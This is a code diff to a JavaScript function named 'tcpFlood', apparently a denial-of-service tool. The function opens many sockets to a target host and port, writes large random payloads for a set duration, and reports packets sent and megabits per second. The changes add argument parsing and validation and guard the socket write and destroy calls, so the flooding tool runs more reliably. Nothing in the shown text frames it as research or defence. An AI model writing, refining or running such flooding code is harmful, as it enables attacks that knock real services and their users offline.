@@ -7,17 +7,21 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
         return;
     }
 
+    port = parseInt(port);
+    threads = parseInt(threads);
+    duration = parseInt(duration);
+
     if (!Number.isInteger(port) || port <= 0 || port > 65535) {
         console.warn("Port must be a valid integer between 1 and 65535. Using default value of 80.");
         port = 80;
     }
 
-    if (threads <= 0) {
+    if (!Number.isInteger(threads) || threads <= 0) {
         console.warn("Number of threads must be greater than 0. Using default value of 10.");
         threads = 10;
     }
 
-    if (duration <= 0) {
+    if (!Number.isInteger(duration) || duration <= 0) {
         console.warn("Duration must be greater than 0. Using default value of 60 seconds.");
         duration = 60;
     }
@@ -37,7 +41,9 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
             sockets.splice(index, 1);
         }
         try {
-            socket.destroy();
+            if(socket && typeof socket.destroy === 'function'){
+                socket.destroy();
+            }
         } catch (e) {
             console.error("Error destroying socket:", e);
         }
@@ -77,21 +83,23 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
                         const randomData = Math.random().toString(36).repeat(500);
                         payload += randomData;
 
-                        socket.write(payload, () => {
-                            packetsSent++;
-                            bytesSent += payload.length;
+                        if(socket && typeof socket.write === 'function'){
+                             socket.write(payload, () => {
+                                packetsSent++;
+                                bytesSent += payload.length;
 
-                            const elapsedTime = (Date.now() - startTime) / 1000;
-                            const mbps = (bytesSent / 1000000) / elapsedTime;
+                                const elapsedTime = (Date.now() - startTime) / 1000;
+                                const mbps = (bytesSent / 1000000) / elapsedTime;
 
-                            if (statusCallback) {
-                                statusCallback({
-                                    status: 'packet_sent',
-                                    packets: packetsSent,
-                                    mbps: mbps.toFixed(2)
-                                });
-                            }
-                        });
+                                if (statusCallback) {
+                                    statusCallback({
+                                        status: 'packet_sent',
+                                        packets: packetsSent,
+                                        mbps: mbps.toFixed(2)
+                                    });
+                                }
+                            });
+                        }
 
 
                     } catch (err) {
